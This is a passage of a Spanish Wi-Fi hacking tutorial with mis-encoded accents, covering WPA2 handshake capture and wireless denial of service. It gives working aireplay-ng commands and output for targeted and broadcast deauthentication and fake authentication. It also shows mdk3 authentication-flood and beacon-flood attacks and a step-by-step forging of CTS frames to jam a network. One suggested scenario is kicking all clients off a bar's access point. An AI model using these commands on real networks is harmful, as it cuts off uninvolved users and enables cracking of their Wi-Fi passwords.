PodrÃ­as pensar, Â¿entonces tengo que quedarme esperando hasta que por X razÃ³n una estaciÃ³n se re-asocie al AP?,
no exactamente. Ese tipo de escenario se le considerarÃ­a escenario pasivo, pues nosotros como atacantes no
estarÃ­amos interviniendo para manipular el trÃ¡fico del AP. 

Existe un escenario activo, el cual pondremos en prÃ¡ctica, donde como atacantes somos capaces de elaborar
externamente sin estar asociados a un AP, un ataque de de-autenticaciÃ³n, consiguiendo asÃ­ expulsar a uno o
mÃºltiples clientes de una red inalÃ¡mbrica sin consentimiento.

Un Handshake al fin y al cabo quedarÃ¡ marcado como un Hash, el cual podremos extraer de la captura
posteriormente para iniciar un ataque de fuerza bruta.

### TÃ©cnicas para capturar un Handshake

A continuaciÃ³n, se representan distintas tÃ©cnicas con el propÃ³sito de capturar un Handshake de la red fijada
como objetivo.

#### Ataque de deautenticaciÃ³n dirigido

El protocolo IEEE 802.11 (Wi-Fi), contiene la provisiÃ³n para un **marco de deautenticaciÃ³n**. Como atacantes,
para este ataque lo que haremos serÃ¡ enviar un marco de deautenticaciÃ³n al punto de acceso inalÃ¡mbrico
objetivo, especificando la direcciÃ³n MAC del cliente que queremos que sea expulsado de la red.

El proceso de enviar dicho marco al punto de acceso se denomina '**TÃ©cnica autorizada para informar a una
estaciÃ³n no autorizada que se ha desconectado de la red**'.

En otras palabras, estarÃ­amos poniendo en prÃ¡ctica el siguiente esquema:

<img align="center" src="https://funkyimg.com/i/2W6cB.png">

Para retomar la captura por donde lo habÃ­amos dejado, os vuelvo a representar el caso:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

Por tanto, tenemos un cliente **34:41:5D:46:D1:38** asociado al AP **hacklab**. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **aireplay-ng**.

'**Aireplay-ng**' cuenta con diferentes modos:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo

--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

Para este caso, nos interesa el parÃ¡metro '**-0**', el cual tambiÃ©n puede ser usado con el parÃ¡metro
'**--deauth**'.

La sintaxis serÃ­a la siguiente:

* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticaciÃ³n no funcione, pues **aireplay** no sabe sobre quÃ© canal
operar.

Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticaciÃ³n a la estaciÃ³n objetivo, haciendo asÃ­ que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado. 

Es posible incluso especificar un valor '**0**', haciÃ©ndole saber asÃ­ a **aireplay** que queremos enviar un
nÃºmero infinito/ilimitado de paquetes de deautenticaciÃ³n a la estaciÃ³n objetivo:

* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

Esto mismo lo podrÃ­amos haber hecho especificando la direcciÃ³n MAC del AP en vez de su **ESSID**:

* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon

Obteniendo los siguientes resultados:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
```

Ahora bien, para saber si nuestros paquetes estÃ¡n surtiendo efecto sobre la estaciÃ³n, el truco estÃ¡ en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
Siempre que este sea mayor que 0, ello querrÃ¡ decir que nuestros paquetes estÃ¡n siendo enviados correctamente
a la estaciÃ³n.

Si haces estas practicas en local, podrÃ¡s comprobar cÃ³mo tu dispositivo en caso de haber sido la estaciÃ³n
vÃ­ctima, habrÃ­a sido desconectado del AP. Por otro lado, aunque lo veremos mÃ¡s adelante, imaginemos que ahora
paramos el ataque, Â¿quÃ© creÃ©is que pasarÃ­a?. Fijaros que en la mayorÃ­a de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados. 

Esto es asÃ­ debido a los paquetes **Probe Request**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2>/dev/null
   49 1.516614496 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  242 9.119006178 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  473 17.062963738 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  487 17.411192451 HonHaiPr_17:91:c0 â†’ Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  511 18.533411763 IntelCor_46:d1:38 â†’ Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
  512 18.552100778 IntelCor_46:d1:38 â†’ Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
  513 18.556049394 IntelCor_46:d1:38 â†’ Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  515 18.649006729 Google_71:cf:8c â†’ Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  516 18.650498757 Google_71:cf:8c â†’ Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c â†’ Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  518 18.670480133 Google_71:cf:8c â†’ Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c â†’ Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Y es justamente aquÃ­ donde estÃ¡ la gracia, pues de parar el ataque, el dispositivo lo que de manera automÃ¡tica
harÃ¡ serÃ¡ reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generarÃ¡ el Handshake:

```bash
 CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
 ```

 Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la direcciÃ³n
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.

 Jugaremos con el Handshake mÃ¡s adelante, veamos primero otras formas de obtener el Handshake.

 #### Ataque de deautenticaciÃ³n global

 Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es mÃ¡s factible lanzar
 otro tipo de ataque, el **ataque de deautenticaciÃ³n global**.

 A diferencia del ataque de deautenticaciÃ³n dirigido, en el ataque de deautenticaciÃ³n global, se hace uso de
 una **Broadcast MAC Address** como direcciÃ³n MAC de estaciÃ³n objetivo a utilizar. Lo que conseguimos con esta
 direcciÃ³n MAC, es expulsar a todos los clientes que se encuentren asociados el AP.

 Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el **PWR** como a nivel de **Frames** emitidos por la estaciÃ³n). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta mÃ¡s cÃ³modo expulsarlos a todos.

 Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake vÃ¡lido. Hay que tener en
 cuenta que es posible capturar mÃºltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningÃºn problema.

 El ataque se puede elaborar de 2 formas, una es la siguiente:

 * aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon

Obteniendo los siguientes resultados:

 ```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon
21:10:33  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
21:10:33  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [ 2| 0 ACKs]
 ```

Y la otra sin especificar ninguna direcciÃ³n MAC, lo que por defecto la suite interpretarÃ¡ como un ataque de
deautenticaciÃ³n global:

* aireplay-ng -0 0 -e hacklab wlan0mon

Obteniendo estos resultados:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #aireplay-ng -0 10 -e hacklab wlan0mon
21:11:46  Waiting for beacon frame (ESSID: hacklab) on channel 12
Found BSSID "20:34:FB:B1:C5:53" to given ESSID "hacklab".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
```

#### Ataque de autenticaciÃ³n

Puede sonar raro, pero tambiÃ©n existe un ataque llamado ataque de autenticaciÃ³n o asociaciÃ³n. A travÃ©s de este
ataque, en vez de expulsar a clientes de una red, lo que hacemos es aÃ±adirlos.

Te preguntarÃ¡s, Â¿y quÃ© consigo con eso?, buena pregunta. Nuestro objetivo como atacantes es hacer siempre que
de una u otra forma, los clientes de una red sean reasociados para capturar un Handshake. 

Â¿QuÃ© crees que pasarÃ­a si en una red inyectamos 5.000 clientes?, exacto, por ahÃ­ van los tiros. Si una red
dispone de tantos clientes asociados, el router se vuelve loco... incluso hasta notarÃ­amos de hacerlo en local
que la red comenzarÃ­a a ir lenta, llegando al punto en el que serÃ­amos expulsados de esta hasta detener el
ataque.

Inyectar a un cliente es bastante sencillo, lo hacemos a travÃ©s del parÃ¡metro '**-1**' de aireplay:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #echo; aireplay-ng --help | tail -n 13 | grep "\-1" | sed '/^\s*$/d' | sed 's/^ *//'; echo

--fakeauth    delay : fake authentication with AP (-1)
```

Imaginemos que tenemos este escenario:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                
```

Veamos cÃ³mo podrÃ­amos por ejemplo llevar a cabo una falsa autenticaciÃ³n haciendo uso de nuestra tarjeta de red
como estaciÃ³n:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #aireplay-ng -1 0 -e MOVISTAR_1677 -h 00:a0:8b:cd:02:65 wlan0mon
21:20:28  Waiting for beacon frame (ESSID: MOVISTAR_1677) on channel 6
Found BSSID "1C:B0:44:D4:16:78" to given ESSID "MOVISTAR_1677".

21:20:28  Sending Authentication Request (Open System) [ACK]
21:20:28  Authentication successful
21:20:28  Sending Association Request

21:20:33  Sending Authentication Request (Open System) [ACK]
21:20:33  Authentication successful
21:20:33  Sending Association Request

21:20:38  Sending Authentication Request (Open System) [ACK]
21:20:38  Authentication successful
21:20:38  Sending Association Request [ACK]
21:20:38  Association successful :-) (AID: 1)
```

Con el parÃ¡metro '**-h**', especificamos la direcciÃ³n MAC del falso cliente a autenticar. Si volvemos a
analizar ahora la red inalÃ¡mbrica, podremos ver que nuestra tarjeta de red figura como cliente:

```bash
 CH  6 ][ Elapsed: 30 s ][ 2019-08-08 21:20                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 1C:B0:44:D4:16:78  -52  12      232        6    0   6  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                            
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   AC:D1:B8:17:91:C0  -69    0 - 1      0        5                                                                                                                     
 (not associated)   E0:B9:BA:AE:90:FB  -88    0 - 1      0        1                                                                                                                     
 1C:B0:44:D4:16:78  00:A0:8B:CD:02:65    0    0 - 1      0        7                         
```

Cabe decir que esto no hace que nos conectemos a la red directamente y ya tengamos internet, sino menuda
gracia, estarÃ­amos bypasseando la seguridad del pleno 802.11. Lo que estamos haciendo es engaÃ±ar al router,
haciÃ©ndole creer que dispone de ese cliente asociado.

A efectos prÃ¡cticos, por el momento esto no genera ningÃºn inconveniente, Â¿cÃ³mo autenticamos por tanto ahora a
5.000 clientes?. PodrÃ­amos montarnos un simple script que lo hiciera por nosotros generando direcciones MAC
aleatorias, pero ya contamos con una herramienta que nos hace todo el trabajo, **mdk3**.

A travÃ©s de la utilidad **mdk3**, tenemos un modo de ataque '**Authentication DoS Mode**' que se encarga de
asociar a miles de clientes al AP objetivo. Esto se hace haciendo uso de la siguiente sintaxis:

* mdk3 wlan0mon a -a bssidAP

VeÃ¡moslo en la prÃ¡ctica, aplicamos el comando por un lado:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar]
â””â”€â”€â•¼ #mdk3 wlan0mon a -a 20:34:FB:B1:C5:53 # DirecciÃ³n MAC del AP hacklab
```

Si analizamos la consola donde estamos monitorizando el AP, podremos notar lo siguiente:

```bash
 CH 12 ][ Elapsed: 1 min ][ 2019-08-08 21:27                                         
                                                                                         
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                         
 20:34:FB:B1:C5:53  -27 100      819      177    2  12  180  WPA2 CCMP   PSK  hacklab    
                                                                                         
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe               
                                                                                         
 (not associated)   AC:D1:B8:17:91:C0  -73    0 - 1     12       25                       
 20:34:FB:B1:C5:53  22:19:BA:9B:7D:F5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  48:47:15:5C:BB:6F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AF:3B:33:CD:E3:50    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -30    1e- 6e     0      223                       
 20:34:FB:B1:C5:53  3E:A1:41:E1:FC:67    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  21:3D:DC:87:70:E9    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:11:0E:82:74:41    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AB:B2:CD:C6:9B:B4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:17:58:E9:5E:D4    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  31:58:A3:5A:25:5D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  C9:9A:66:32:0D:B7    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  76:5A:2E:63:33:9F    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  54:F8:1B:E8:E7:8D    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F2:FB:E3:46:7C:C2    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  4A:EC:29:CD:BA:AB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  67:C6:69:73:51:FF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3E:01:7E:97:EA:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  6B:96:8F:38:5C:2A    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  EC:B0:3B:FB:32:AF    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  3C:54:EC:18:DB:5C    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  02:1A:FE:43:FB:FA    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:3A:FB:29:D1:E6    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  05:3C:7C:94:75:D8    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  BE:61:89:F9:5C:BB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  A8:99:0F:95:B1:EB    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  F1:B3:05:EF:F7:00    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  E9:A1:3A:E5:CA:0B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  CB:D0:48:47:64:BD    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  1F:23:1E:A8:1C:7B    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:C5:14:73:5A:C5    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  5E:4B:79:63:3B:70    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  64:24:11:9E:09:DC    0    0 - 1      0        1                       
 20:34:FB:B1:C5:53  AA:D4:AC:F2:1B:10    0    0 - 1      0        1      
```

Exacto, una locura de clientes asociados que ni llego a seleccionar de lo largo que es la lista. De manera
casi inmediata, la red comienza a ir lenta y se queda temporalmente inoperativa, llegando a expulsar incluso a
los clientes mÃ¡s lejanos o con poca seÃ±al WiFi.

#### CTS Frame Attack

Un ataque bastante interesante, que incluso puede llegar a dejar inoperativa una red inalÃ¡mbrica durante un
largo perÃ­odo de tiempo, aunque paremos el ataque.

Lo que haremos serÃ¡ abrir **Wireshark** por un lado, capturando paquetes de tipo **CTS** (Clear-To-Send):

<img align="center" src="https://funkyimg.com/i/2W6gT.png">

Recomiendo investigar sobre este tipo de paquetes junto al **RTS**, tienen una historia muy bonita frente al
problema del **nodo oculto**, evitando las famosas colisiones de trama.

Un paquete **CTS** dispone generalmente de 4 campos:

* Frame Control
* DuraciÃ³n
* RA (DirecciÃ³n del Receptor)
* FCS

El campo del tiempo para dicho paquete puede ser visto rÃ¡pidamente desde Wireshark (**304 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6h5.png">

Lo que haremos una vez dispongamos de un paquete **CTS**, serÃ¡ exportar dicho paquete en un formato
'**Wireshark/tcpdump/... -pcap**':

<img align="center" src="https://funkyimg.com/i/2W6hf.png">

Si analizamos la captura, veremos que los datos contemplados siguen siendo los mismos:

<img align="center" src="https://funkyimg.com/i/2W6hp.png">

Una vez llegados a este punto, en mi caso harÃ© uso de la herramienta '**ghex**' para abrir la captura con un
editor hexadecimal:

<img align="center" src="https://funkyimg.com/i/2W6hu.png">

En esta parte es importante hacer la siguiente distinciÃ³n:

* Los Ãºltimos 4 valores: 11 D1 13 85 corresponden al FCS, deberÃ¡n ser computados por cada variaciÃ³n que
  hagamos sobre el resto de valores. Sin embargo, no nos preocupemos por ello... ya que nos lo darÃ¡ el propio
  Wireshark :)

* Los 6 valores anteriores al FCS: **30 45 96 BF 9D 2C**, corresponden a la direcciÃ³n MAC del router. Obviamente, este valor deberÃ¡ de ser cambiado al deseado.

* Los 2 valores anteriores al FCS: **30 01**, corresponden al tiempo en microsegundos puesto en hexadecimal y
  **Little Endian**.

Para el Ãºltimo punto, por si han habido confusiones:

<img align="center" src="https://funkyimg.com/i/2W6hA.png">

AhÃ­ vemos que corresponden a los 304 microsegundos. Ahora bien, aquÃ­ es donde viene el vector de ataque, vamos
a ver cuÃ¡l serÃ­a el valor en hexadecimal del valor tope permitido (**30.000 microsegundos**):

<img align="center" src="https://funkyimg.com/i/2W6hE.png">

Tratemos desde **ghex** de sustituir el valor de los 304 microsegundos a 30.000 microsegundos, poniendo su
representaciÃ³n en hexadecimal y Little Endian:

<img align="center" src="https://funkyimg.com/i/2W6hP.png">

**CONSIDERACIÃ“N**: TambiÃ©n he especificado la direcciÃ³n MAC del AP objetivo en **ghex** (**64:D1:54:88:BA:3C**)

PodrÃ­amos pensar que es asÃ­ de simple, pero no. Recordemos que para cada cambio realizado, hay que computar el
valor del **FCS**, pues de lo contrario el paquete es invÃ¡lido. Uno puede optar por comerse la cabeza y tratar
de hacerlo manualmente, pero otra forma es guardando y abriendo esa propia captura desde **Wireshark**:

<img align="center" src="https://funkyimg.com/i/2W6ia.png">

Como vemos, es una maravilla, dado que ya el propio **Wireshark** nos da el valor del **FCS** que necesitamos
para la captura manipulada. 

Por tanto, le hacemos caso y lo cambiamos (Recordemos el Little Endian, tambiÃ©n se aplica para este caso):

<img align="center" src="https://funkyimg.com/i/2W6in.png">

Una vez llegados a este punto, guardamos la captura y probamos a abrirla nuevamente desde Wireshark:

<img align="center" src="https://funkyimg.com/i/2W6iy.png">

Esto son buenas noticias, pues no nos sale ningÃºn tipo de error, Â¡hemos construido un paquete vÃ¡lido!.

Ahora es cuando viene la parte divertida, inyectemos dicho paquete a nivel de red:

<img align="center" src="https://funkyimg.com/i/2W6iJ.png">

Como vemos, se han tramitado un total de 10.000 paquetes de tipo **CTS** con un tiempo total de 30.000
microsegundos para cada uno. Encima le hemos aÃ±adido el parÃ¡metro '**--topspeed**' para evitar que el
siguiente paquete se enviÃ© una vez el anterior se ha terminado de enviar, haciendo que todos queden en cola.

Por aquÃ­ podemos ver los valores de cada uno de estos paquetes enviados:

<img align="center" src="https://funkyimg.com/i/2W6iP.png">

Â¿Resultado?, lo que se conoce como un secuestro del ancho de banda, haciendo que la red quede completamente
inoperativa durante un largo perÃ­odo de tiempo. No recomiendo hacer el ataque en nuestra propia red.

#### Beacon Flood Mode Attack

Un **beacon** es un paquete que contiene informaciÃ³n sobre el punto de acceso, como por ejemplo, en quÃ© canal
se encuentra, quÃ© tipo de cifrado lleva, cÃ³mo se llama la red, etc.

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==0x8" 2>/dev/null
    1 0.000000000 AskeyCom_d4:16:78 â†’ Broadcast    802.11 328 Beacon frame, SN=1585, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    2 0.307210202 AskeyCom_d4:16:78 â†’ Broadcast    802.11 328 Beacon frame, SN=1588, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    3 0.614413670 AskeyCom_d4:16:78 â†’ Broadcast    802.11 328 Beacon frame, SN=1591, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
    4 0.921614210 AskeyCom_d4:16:78 â†’ Broadcast    802.11 328 Beacon frame, SN=1594, FN=0, Flags=........C, BI=100, SSID=MOVISTAR_1677
```

La peculiaridad de los beacons es que estos se transmiten en claro, ya que las tarjetas de red y otros
dispositivos necesitan poder recoger este tipo de paquetes y extraer la informaciÃ³n necesaria para conectarse.

A travÃ©s de la herramienta **mdk3**, podemos generar un ataque conocido como **Beacon Flood Attack**,
generando montÃ³n de paquetes Beacon con informaciÃ³n falsa. Â¿QuÃ© conseguimos con esto?, pues bueno, uno de los
ataques clÃ¡sicos consistirÃ­a en generar montones de puntos de acceso situados en el mismo canal que un punto
de acceso objetivo, logrando asÃ­ daÃ±ar el espectro de onda de la red dejÃ¡ndola no operativa e invisible por los
usuarios.

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #cat redes.txt 
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 7
```

En este caso, estarÃ­amos generando un buen puÃ±ado de puntos de acceso con los **ESSID** listados en el
archivo, todos ellos posicionados en el canal 7. Para los curiosos, el parÃ¡metro '**-a**' lo que se encarga es
de anunciar redes WPA2, y el parÃ¡metro '**-s**' establece la velocidad de los paquetes emitidos por segundo,
que por defecto estÃ¡n establecidos a 50.

Por si querÃ©is ver cÃ³mo se verÃ­a todo desde un dispositivo tercero que trata de escanear o listar los puntos
de acceso disponibles en el entorno:

<img align="center" src="https://funkyimg.com/i/2W6s8.jpg">

